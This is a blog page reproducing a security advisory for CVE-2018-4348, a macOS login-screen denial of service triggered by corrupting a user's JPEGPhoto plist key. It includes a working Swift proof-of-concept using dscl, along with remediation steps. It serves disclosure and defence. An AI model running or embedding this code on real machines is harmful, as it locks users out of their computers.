<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2018-4348 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2018-4348 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2018-4348" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2018-4348" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2018-4348 Details" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"CVE-2018-4348 Details","url":"http://localhost:4000/cves/cve-2018-4348","description":"Sometimes I want to publish stuff unfiltered.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2018-4348 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecomadvisoriesmacos-user-interface-denial-of-service">Original post: <a href="https://labs.f-secure.com/advisories/macos-user-interface-denial-of-service/">https://labs.f-secure.com/advisories/macos-user-interface-denial-of-service/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>macOS 10.13.6, 10.13.5, 10.12.6 Security Update 2018-004, previous versions may be affected</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>Low</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2018-4348</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Denail of Sevice</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>Various versions of macOS are vulnerable to a Denial of Service attack via the login user interface. A malicious application or an attacker with authenticated command line access to the device can deny the user’s ability to login after the user logs out or reboots the computer.</p>

<h2 id="details">Details</h2>

<p>macOS stores information about local users in the folder <code class="language-plaintext highlighter-rouge">/var/db/dslocal/nodes/Default/users/</code>. Each user is assigned a .plist file which contains configuration details about the specific user. For example, if a user <code class="language-plaintext highlighter-rouge">MWRUser</code> were to exist, then the .plist file <code class="language-plaintext highlighter-rouge">/var/db/dslocal/nodes/Default/users/MWRUser.plist</code> exists as well.</p>

<p>Plist files can contain various types of data, including strings and binary data. The data is provided by several <code class="language-plaintext highlighter-rouge">keys</code> within a .plist configuration file. Two of these keys are <code class="language-plaintext highlighter-rouge">JPEGPhoto</code> and <code class="language-plaintext highlighter-rouge">Picture</code>, which manage the user’s profile picture.</p>

<p>It was found that if the <code class="language-plaintext highlighter-rouge">JPEGphoto</code> key did not contain binary data, then the macOS operating system would crash while trying to render a profile picture for the user. This would cause the operating system to fail to load the macOS login screen, thus denying the user the ability to log into the computer via the user interface.</p>

<h2 id="impact">Impact</h2>

<p>Users of the targeted macOS system would not be able to log into their computer via the user interface.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>The following terminal commands could be ran by any user or application to replicate this issue. It should be noted that low level users can only modify specific data about their own user account:</p>

<p>After logging out or restarting the macOS operating system, the user would be unable to log into the macOS operating system.</p>

<p>MWR created the following Swift code that could be used by any application to replicate this issue:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import Foundation

@discardableResult
func shell(_ args: String...) -&gt; Int32 {
    let task = Process()
    task.launchPath = "/usr/bin/env"
    task.arguments = args
    task.launch()
    task.waitUntilExit()
    return task.terminationStatus
}

var username = NSUserName()
var dscl_user = "/Users/" + username
 
shell("/usr/bin/dscl", ".", "delete", dscl_user, "JPEGPhoto")
shell("/usr/bin/dscl", ".", "append", dscl_user, "JPEGPhoto", "mwrinfosecurity")
</code></pre></div></div>

<h2 id="solution">Solution</h2>

<p>Apple has released the following updates which are not vulnerable to this issue:</p>

<ul>
  <li>macOS Mojave 10.14</li>
  <li>macOS High Sierra 10.13.6 Security Update 2018-001</li>
  <li>macOS Sierra 10.12.6 Security Update 2018-005</li>
</ul>

<p>Users should update their computers so that they are immune to this attack.</p>

<p>Alternatively, if this attack were to be used on a vulnerable macOS computer, a user can boot their computer into recovery mode, open a terminal window and run the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /usr/libexec/Plistbuddy –c “Delete jpegphoto” /Volumes/&lt;mounted macOS system&gt;/var/db/dslocal/nodes/Default/users/&lt;username&gt;.plist
</code></pre></div></div>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
